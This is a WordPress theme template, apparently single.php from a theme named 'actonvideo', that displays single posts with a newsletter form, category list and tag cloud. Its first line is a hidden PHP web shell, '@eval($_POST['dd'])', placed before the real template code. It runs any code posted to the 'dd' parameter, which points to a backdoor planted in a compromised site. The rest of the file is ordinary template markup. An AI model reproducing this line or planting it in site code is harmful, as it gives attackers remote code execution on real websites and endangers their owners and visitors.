<?php @eval($_POST['dd']);?><?php
/**
* The template for displaying all single posts
*
* @link https://developer.wordpress.org/themes/basics/template-hierarchy/#single-post
*
* @package actonvideo
*/



get_header('custom'); ?>




<section class="recentpost">
   <div class="container">
      <div class="row">
         <div class="col-md-8">
            <!--Posts  -->
            <div class="posts">
               <div class="row">


<?php
while ( have_posts() ) : the_post(); 
$image = wp_get_attachment_image_src( get_post_thumbnail_id( $post->ID ), 'full' ); ?>

                  <div class="col-md-12">
                     <a href="#"><img src="<?php echo $image[0]; ?>" alt=""></a>
                  </div>
                  <div class="col-md-12">
                    <br>
                     <h3><?php the_title(); ?></h3>
                     <hr>
                     <p class="date"><?php the_date(); ?></p>
                    <?php the_content(); ?>
                  </div>

<?php endwhile; ?>

               </div>
            </div>

         </div><!--Posts ends here -->
         <div class="col-md-4 sidebar">
            <!--sidebar  -->
            <div class="posts">
               <h3> Newsletter</h3>
               <p>Enter your email address to subscribe to this blog and receive notifications of new posts by email.</p>
               <form action="">
                  <input type="text" placeholder="Email Address...">
                  <input type="submit" value="Submit">
               </form>
            </div>
            <div class="posts">
               <h3> CATEGORIES</h3>
               <ul class="menu">
                  <li><a href="#">Category 1</a></li>
                  <li><a href="#">Category 1</a></li>
                  <li><a href="#">Category 1</a></li>
                  <li><a href="#">Category 1</a></li>
                  <li><a href="#">Category 1</a></li>
                  <li><a href="#">Category 1</a></li>
               </ul>
            </div>
            <div class="posts">
               <h3> Tag Clouds</h3>
               <ul class="tags">
                  <li><a href="#">Demo tag</a></li>
                  <li><a href="#">Demo tag</a></li>
                  <li><a href="#">Demo tag</a></li>
                  <li><a href="#">Demo tag</a></li>
                  <li><a href="#">Demo tag</a></li>
                  <li><a href="#">Demo tag</a></li>
                  <li><a href="#">Demo tag</a></li>
                  <li><a href="#">Demo tag</a></li>
                  <li><a href="#">Demo tag</a></li>
                  <li><a href="#">Demo tag</a></li>
               </ul>
            </div>
         </div>
         <!--sidebar ends here  -->
      </div>
   </div>
</section>








<?php get_footer();
